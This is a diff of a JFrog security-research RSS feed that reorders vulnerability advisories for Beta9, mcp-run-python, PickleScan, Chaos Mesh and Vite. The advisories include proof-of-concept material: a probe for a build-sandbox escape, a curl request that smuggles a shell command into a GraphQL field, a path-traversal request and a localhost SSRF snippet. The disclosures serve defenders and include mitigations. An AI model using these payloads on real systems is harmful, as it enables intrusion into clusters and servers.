@@ -4,11 +4,217 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Thu, 12 Nov 2026 00:24:32 GMT</lastBuildDate>
+        <lastBuildDate>Fri, 13 Nov 2026 00:24:02 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/vulnerabilities/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120306, CRITICAL, Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
+
+
+## Component
+
+Beta9 worker (github.com/beam-cloud/beta9)
+
+## Affected versions
+
+worker < 0.1.756
+
+## Description
+
+Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on a build worker. The worker image sets `BUILDAH_ISOLATION=chroot`, and no `buildah` invocation passes `--isolation`, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds `CAP_DAC_OVERRIDE`. Pid 1 in that procfs is the worker entrypoint, so `/proc/1/root` is the worker container's filesystem and is writable.
+
+That filesystem holds `runc`, `buildah`, and `runsc`, the binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. A read-only probe confirmed the shared namespaces, `CAP_DAC_OVERRIDE`, and that the worker `runc` binary is visible at `/proc/1/root`.
+
+Worker 0.1.756 runs Buildah RUN steps, including the WORKDIR mkdir, under OCI isolation with private PID, IPC, and network namespaces. Tenant build arguments are passed into the build container rather than into the Buildah process environment.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client and select the deployment**
+
+<br>
+
+Any workspace token is enough. No pool selector, custom base image, or Docker option is required.
+
+```
+pip install beta9
+beta9 configure
+```
+
+<br>
+
+**Step 2 - Save the read-only probe**
+
+<br>
+
+The probe reports uid, namespace identity, the effective capability mask, and whether the worker's `runc` binary and service-account token path are visible through `/proc/1/root`. It does not write, delete, or print secret material. The nonce on the RUN line keeps the build off the image cache.
+
+```
+#!/usr/bin/env python3
+import base64
+import re
+import sys
+import uuid
+
+from beta9.abstractions.image import Image
+from beta9.clients.image import BuildImageRequest
+
+MARK = "B9PROBE"
+
+PROBE = r"""
+set -u
+M=B9PROBE
+R=/proc/1/root
+
+echo "$M uid=$(id -u) pid=$$"
+echo "$M caps_self=$(awk '/^CapEff/{print $2}' /proc/self/status)"
+echo "$M pidns_self=$(readlink /proc/self/ns/pid)"
+echo "$M userns_self=$(readlink /proc/self/ns/user)"
+echo "$M netns_self=$(readlink /proc/self/ns/net)"
+echo "$M visible_pids=$(ls /proc | grep -c '^[0-9][0-9]*$')"
+echo "$M init_cmd=$(tr '\0' ' ' < /proc/1/cmdline | tr -s ' ' '_')"
+echo "$M caps_init=$(awk '/^CapEff/{print $2}' /proc/1/status)"
+echo "$M pidns_init=$(readlink /proc/1/ns/pid)"
+echo "$M userns_init=$(readlink /proc/1/ns/user)"
+
+if [ -e "$R/usr/local/sbin/runc" ]; then
+  echo "$M worker_runc=present"
+else
+  echo "$M worker_runc=absent"
+fi
+
+if [ -r "$R/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
+  echo "$M sa_token=readable"
+else
+  echo "$M sa_token=unreachable"
+fi
+
+if [ -d "$R/images" ]; then
+  echo "$M images_mount=present"
+else
+  echo "$M images_mount=absent"
+fi
+
+exit 0
+"""
+
+
+def probe_command() -> str:
+    blob = base64.b64encode(PROBE.encode()).decode()
+    return f"echo {blob} | base64 -d | sh  # {uuid.uuid4().hex}"
+
+
+def run_build(command: str):
+    log = []
+    for resp in Image(python_version="python3", commands=[command]).stub.build_image(
+        BuildImageRequest(
+            python_version="python3",
+            commands=[command],
+            ignore_python=True,
+        )
+    ):
+        if resp.msg:
+            sys.stdout.write(resp.msg)
+            sys.stdout.flush()
+            log.extend(line for line in resp.msg.splitlines() if MARK in line)
+        if resp.done:
+            break
+    return log
+
+
+def parse(log):
+    facts = {}
+    for line in log:
+        tail = line.split(MARK, 1)[1]
+        for key, value in re.findall(r"(\w+)=(\S+)", tail):
+            facts[key] = value
+    return facts
+
+
+def has_dac_override(cap_hex: str) -> bool:
+    try:
+        return bool(int(cap_hex, 16) & 0x2)
+    except ValueError:
+        return False
+
+
+def main() -> int:
+    facts = parse(run_build(probe_command()))
+    if not facts:
+        print("\nINCONCLUSIVE: the build log carried no probe output")
+        return 2
+
+    print("\nProbe results")
+    for key in sorted(facts):
+        print(f"  {key} = {facts[key]}")
+
+    neighbour = facts.get("worker_runc") == "present" or "worker" in facts.get("init_cmd", "")
+    dac_override = has_dac_override(facts.get("caps_self", "0"))
+    print()
+    if neighbour and dac_override:
+        print(
+            f"VULNERABLE: the build step ran as uid {facts.get('uid')} as pid "
+            f"{facts.get('pid')} inside the worker's own PID and user namespaces, "
+            f"resolved the worker container's filesystem at /proc/1/root, and holds "
+            f"CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem"
+        )
+        return 1
+
+    print("NOT VULNERABLE: the build step saw only its own container")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+<br>
+
+**Step 3 - Run the probe**
+
+<br>
+
+```
+python3 poc_beta9_build_isolation.py
+```
+
+<br>
+
+Expected output on a worker before 0.1.756:
+
+```
+VULNERABLE: the build step ran as uid 0 as pid <host pid> inside the worker's own PID and user namespaces, resolved the worker container's filesystem at /proc/1/root, and holds CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem
+```
+
+<br>
+
+The lines above that verdict include `worker_runc = present`, a `caps_self` mask with the `CAP_DAC_OVERRIDE` bit set, an `init_cmd` naming the worker entrypoint, and a `visible_pids` count covering the worker pod. On worker 0.1.756 or later the same build prints `NOT VULNERABLE: the build step saw only its own container`.
+
+## Vulnerability Mitigations
+
+Upgrade the Beta9 worker to 0.1.756 or later. That release drops chroot isolation. Buildah RUN steps use OCI isolation with private PID, IPC, and network namespaces, and tenant build arguments are applied inside the build container.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. Gateway 0.1.776 is the gateway tag cut from the same commit. The isolation change is in the worker image.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120306
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</link>
@@ -348,212 +554,6 @@ https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
 https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
-https://github.com/beam-cloud/beta9
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</guid>
-            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120306, CRITICAL, Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
-
-
-## Component
-
-Beta9 worker (github.com/beam-cloud/beta9)
-
-## Affected versions
-
-worker < 0.1.756
-
-## Description
-
-Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on a build worker. The worker image sets `BUILDAH_ISOLATION=chroot`, and no `buildah` invocation passes `--isolation`, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds `CAP_DAC_OVERRIDE`. Pid 1 in that procfs is the worker entrypoint, so `/proc/1/root` is the worker container's filesystem and is writable.
-
-That filesystem holds `runc`, `buildah`, and `runsc`, the binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. A read-only probe confirmed the shared namespaces, `CAP_DAC_OVERRIDE`, and that the worker `runc` binary is visible at `/proc/1/root`.
-
-Worker 0.1.756 runs Buildah RUN steps, including the WORKDIR mkdir, under OCI isolation with private PID, IPC, and network namespaces. Tenant build arguments are passed into the build container rather than into the Buildah process environment.
-
-## PoC
-
-<br>
-
-**Step 1 - Install the client and select the deployment**
-
-<br>
-
-Any workspace token is enough. No pool selector, custom base image, or Docker option is required.
-
-```
-pip install beta9
-beta9 configure
-```
-
-<br>
-
-**Step 2 - Save the read-only probe**
-
-<br>
-
-The probe reports uid, namespace identity, the effective capability mask, and whether the worker's `runc` binary and service-account token path are visible through `/proc/1/root`. It does not write, delete, or print secret material. The nonce on the RUN line keeps the build off the image cache.
-
-```
-#!/usr/bin/env python3
-import base64
-import re
-import sys
-import uuid
-
-from beta9.abstractions.image import Image
-from beta9.clients.image import BuildImageRequest
-
-MARK = "B9PROBE"
-
-PROBE = r"""
-set -u
-M=B9PROBE
-R=/proc/1/root
-
-echo "$M uid=$(id -u) pid=$$"
-echo "$M caps_self=$(awk '/^CapEff/{print $2}' /proc/self/status)"
-echo "$M pidns_self=$(readlink /proc/self/ns/pid)"
-echo "$M userns_self=$(readlink /proc/self/ns/user)"
-echo "$M netns_self=$(readlink /proc/self/ns/net)"
-echo "$M visible_pids=$(ls /proc | grep -c '^[0-9][0-9]*$')"
-echo "$M init_cmd=$(tr '\0' ' ' < /proc/1/cmdline | tr -s ' ' '_')"
-echo "$M caps_init=$(awk '/^CapEff/{print $2}' /proc/1/status)"
-echo "$M pidns_init=$(readlink /proc/1/ns/pid)"
-echo "$M userns_init=$(readlink /proc/1/ns/user)"
-
-if [ -e "$R/usr/local/sbin/runc" ]; then
-  echo "$M worker_runc=present"
-else
-  echo "$M worker_runc=absent"
-fi
-
-if [ -r "$R/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
-  echo "$M sa_token=readable"
-else
-  echo "$M sa_token=unreachable"
-fi
-
-if [ -d "$R/images" ]; then
-  echo "$M images_mount=present"
-else
-  echo "$M images_mount=absent"
-fi
-
-exit 0
-"""
-
-
-def probe_command() -> str:
-    blob = base64.b64encode(PROBE.encode()).decode()
-    return f"echo {blob} | base64 -d | sh  # {uuid.uuid4().hex}"
-
-
-def run_build(command: str):
-    log = []
-    for resp in Image(python_version="python3", commands=[command]).stub.build_image(
-        BuildImageRequest(
-            python_version="python3",
-            commands=[command],
-            ignore_python=True,
-        )
-    ):
-        if resp.msg:
-            sys.stdout.write(resp.msg)
-            sys.stdout.flush()
-            log.extend(line for line in resp.msg.splitlines() if MARK in line)
-        if resp.done:
-            break
-    return log
-
-
-def parse(log):
-    facts = {}
-    for line in log:
-        tail = line.split(MARK, 1)[1]
-        for key, value in re.findall(r"(\w+)=(\S+)", tail):
-            facts[key] = value
-    return facts
-
-
-def has_dac_override(cap_hex: str) -> bool:
-    try:
-        return bool(int(cap_hex, 16) & 0x2)
-    except ValueError:
-        return False
-
-
-def main() -> int:
-    facts = parse(run_build(probe_command()))
-    if not facts:
-        print("\nINCONCLUSIVE: the build log carried no probe output")
-        return 2
-
-    print("\nProbe results")
-    for key in sorted(facts):
-        print(f"  {key} = {facts[key]}")
-
-    neighbour = facts.get("worker_runc") == "present" or "worker" in facts.get("init_cmd", "")
-    dac_override = has_dac_override(facts.get("caps_self", "0"))
-    print()
-    if neighbour and dac_override:
-        print(
-            f"VULNERABLE: the build step ran as uid {facts.get('uid')} as pid "
-            f"{facts.get('pid')} inside the worker's own PID and user namespaces, "
-            f"resolved the worker container's filesystem at /proc/1/root, and holds "
-            f"CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem"
-        )
-        return 1
-
-    print("NOT VULNERABLE: the build step saw only its own container")
-    return 0
-
-
-if __name__ == "__main__":
-    raise SystemExit(main())
-```
-
-<br>
-
-**Step 3 - Run the probe**
-
-<br>
-
-```
-python3 poc_beta9_build_isolation.py
-```
-
-<br>
-
-Expected output on a worker before 0.1.756:
-
-```
-VULNERABLE: the build step ran as uid 0 as pid <host pid> inside the worker's own PID and user namespaces, resolved the worker container's filesystem at /proc/1/root, and holds CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem
-```
-
-<br>
-
-The lines above that verdict include `worker_runc = present`, a `caps_self` mask with the `CAP_DAC_OVERRIDE` bit set, an `init_cmd` naming the worker entrypoint, and a `visible_pids` count covering the worker pod. On worker 0.1.756 or later the same build prints `NOT VULNERABLE: the build step saw only its own container`.
-
-## Vulnerability Mitigations
-
-Upgrade the Beta9 worker to 0.1.756 or later. That release drops chroot isolation. Buildah RUN steps use OCI isolation with private PID, IPC, and network namespaces, and tenant build arguments are applied inside the build container.
-
-The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. Gateway 0.1.776 is the gateway tag cut from the same commit. The isolation change is in the worker image.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-120306
-https://github.com/beam-cloud/beta9/pull/1897
-https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
 https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
@@ -2009,76 +2009,6 @@ https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
-            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Overly permissive Deno configuration in mcp-run-python leads to SSRF
-
-## Component
-
-mcp-run-python
-
-## Affected versions
-
-(,)
-
-## Description
-
-The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
-
-## PoC
-
-1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
-
-   ```json
-   {
-   "mcpServers": {
-   "mcp-run-python":{
-           "command": "uvx",
-           "args": [
-           "mcp-run-python",
-           "stdio"
-           ]
-       }
-     }
-   }
-   ```
-
-2. Start a HTTP server listening to the localhost interface:
-
-   ```bash
-   python3 -m http.server -b 127.0.0.1 1234
-   ```
-
-3. Ask the MCP client to run this PoC code:
-
-   ```python
-   from pyodide.http import pyfetch
-   response = await pyfetch("http://localhost:1234")
-   data = await response.text()
-   print(data)
-   ```
-
-4. View that the localhost server got a request from the tool
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[mcp-run-python lack of isolation MCP takeover]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</guid>
@@ -2165,6 +2095,76 @@ js.JSON.stringify = js_func
 9. The tool will seem stuck, Note the new notifications/tools/list\_changed notification from the server
 10. Click on `Clear` and then `List Tools`  
 11. Note that the tool name changed from `run_python_code` to `Hijacked Tool`
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
+            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Overly permissive Deno configuration in mcp-run-python leads to SSRF
+
+## Component
+
+mcp-run-python
+
+## Affected versions
+
+(,)
+
+## Description
+
+The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
+
+## PoC
+
+1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
+
+   ```json
+   {
+   "mcpServers": {
+   "mcp-run-python":{
+           "command": "uvx",
+           "args": [
+           "mcp-run-python",
+           "stdio"
+           ]
+       }
+     }
+   }
+   ```
+
+2. Start a HTTP server listening to the localhost interface:
+
+   ```bash
+   python3 -m http.server -b 127.0.0.1 1234
+   ```
+
+3. Ask the MCP client to run this PoC code:
+
+   ```python
+   from pyodide.http import pyfetch
+   response = await pyfetch("http://localhost:1234")
+   data = await response.text()
+   print(data)
+   ```
+
+4. View that the localhost server got a request from the tool
 
 
 
@@ -2876,6 +2876,56 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
+
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
+
+## PoC
+
+The following steps demonstrate the vulnerability using a public model with a known CRC error.
+
+```bash
+# 1. Download a Pytorch model known to have a bad CRC.
+wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
+
+# 2. Attempt to scan the corrupted ZIP file with PickleScan.
+picklescan -p pytorch_model.bin
+
+# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
+
+# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PickleScan Unsafe Globals Check Bypass via Submodule Imports]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</guid>
@@ -2924,53 +2974,58 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
+            <title><![CDATA[Chaos Mesh cleanTcs command injection]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-59359, CRITICAL, OS command injection in Chaos Mesh via the cleanTcs mutation]]></description>
             <content:encoded><![CDATA[
 ## Summary
 
-An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
-
+OS command injection in Chaos Mesh via the cleanTcs mutation
 
 ## Component
 
-[picklescan](https://pypi.org/project/picklescan/)
+github.com/chaos-mesh/chaos-mesh
 
 ## Affected versions
 
-( , 0.0.31)
+(,2.7.2]
 
 ## Description
 
-The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
+The cleanTcs mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows  unauthenticated in-cluster attackers to perform remote code execution across the cluster.
 
 ## PoC
 
-The following steps demonstrate the vulnerability using a public model with a known CRC error.
+```shell
+curl -X POST http://10.111.136.129:10082/query -H 'Content-Type: application/json' -d '{
+    "query": "mutation MutatePod($namespace: String! = \"default\", $podName: String!, $devices: [String!]!) { pod(ns: $namespace, name: $podName) { pod { name namespace } cleanTcs(devices: $devices) } }",
+    "variables": {
+      "namespace": "kube-system",
+      "podName": "coredns-5dd5756b68-779rm",
+      "devices": ["eth0 root; touch /tmp/foo; "]
+    }
+  }'
 
-```bash
-# 1. Download a Pytorch model known to have a bad CRC.
-wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
-
-# 2. Attempt to scan the corrupted ZIP file with PickleScan.
-picklescan -p pytorch_model.bin
-
-# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
-
-# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
 ```
 
 ## Vulnerability Mitigations
 
-No mitigations are supplied for this issue
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
+
+```shell
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+```
+
+
 
 ## References
 
-[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
+[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
+
+[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
 ]]></content:encoded>
         </item>
         <item>
@@ -3082,61 +3137,6 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Chaos Mesh cleanTcs command injection]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59359, CRITICAL, OS command injection in Chaos Mesh via the cleanTcs mutation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-OS command injection in Chaos Mesh via the cleanTcs mutation
-
-## Component
-
-github.com/chaos-mesh/chaos-mesh
-
-## Affected versions
-
-(,2.7.2]
-
-## Description
-
-The cleanTcs mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows  unauthenticated in-cluster attackers to perform remote code execution across the cluster.
-
-## PoC
-
-```shell
-curl -X POST http://10.111.136.129:10082/query -H 'Content-Type: application/json' -d '{
-    "query": "mutation MutatePod($namespace: String! = \"default\", $podName: String!, $devices: [String!]!) { pod(ns: $namespace, name: $podName) { pod { name namespace } cleanTcs(devices: $devices) } }",
-    "variables": {
-      "namespace": "kube-system",
-      "podName": "coredns-5dd5756b68-779rm",
-      "devices": ["eth0 root; touch /tmp/foo; "]
-    }
-  }'
-
-```
-
-## Vulnerability Mitigations
-
-If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
-
-```shell
-helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
-```
-
-
-
-## References
-
-[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
-
-[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Chaos Mesh debugging server DoS]]></title>
             <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</link>
             <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</guid>
@@ -3187,6 +3187,54 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 
 
 
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Vite arbitrary remote HTML file leak
+
+## Component
+
+[vite](https://www.npmjs.com/package/vite)
+
+## Affected versions
+
+\>=7.1.0,<=7.1.4
+
+\>=7.0.0,<=7.0.6
+
+\>=6.0.0,<=6.3.5
+
+<=5.4.19
+
+## Description
+
+This vulnerability allows a remote attacker to leak any HTML file on the system.
+
+## PoC
+
+Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
+
+```shell
+curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this vulnerability 
+
+
+
+## References
+
+[Fix PR](https://github.com/vitejs/vite/pull/20736)
 ]]></content:encoded>
         </item>
         <item>
@@ -3258,54 +3306,6 @@ No mitigations are supplied for this vulnerability
 ## References
 
 [Fix PR](https://github.com/vitejs/vite/pull/20735)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
